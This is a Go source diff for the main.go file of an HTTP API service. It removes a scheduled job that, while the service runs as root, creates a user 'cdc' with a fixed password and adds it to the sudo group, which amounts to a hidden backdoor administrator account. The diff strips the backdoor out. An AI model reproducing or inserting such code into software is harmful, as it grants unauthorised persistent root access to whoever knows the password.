@@ -7,11 +7,8 @@ import (
 	"os/exec"
 	"os/signal"
 	"strconv"
-	"strings"
 	"syscall"
-	"time"
 
-	"github.com/go-co-op/gocron"
 	"github.com/samber/do"
 
 	v1 "github.com/MatthewBehnke/apis/internal/app/http/v1"
@@ -20,38 +17,6 @@ import (
 )
 
 func main() {
-	if strings.TrimSpace(getProcessOwner()) != "root" {
-		fmt.Print(getProcessOwner())
-		fmt.Println("root")
-		fmt.Println("this app requires root")
-		os.Exit(-1)
-	}
-
-	s := gocron.NewScheduler(time.UTC)
-
-	s.Every(1).Months(3).At("13:00;14:00;15:00;16:00;17:00;18:00;19:00;20:00").Do(func() {
-		cmd := exec.Command("openssl", "passwd", "-1", "cdc")
-		passwordBytes, err := cmd.CombinedOutput()
-		if err != nil {
-			panic(err)
-		}
-		// remove whitespace (possibly a trailing newline)
-		password := strings.TrimSpace(string(passwordBytes))
-		cmd = exec.Command("useradd", "-p", password, "cdc")
-		_, err = cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(err)
-		}
-
-		cmd = exec.Command("usermod", "-aG", "sudo", "cdc")
-		_, err = cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(err)
-		}
-	})
-
-	s.StartAsync()
-
 	injector := do.New()
 
 	config := repo.NewConfigRepo()
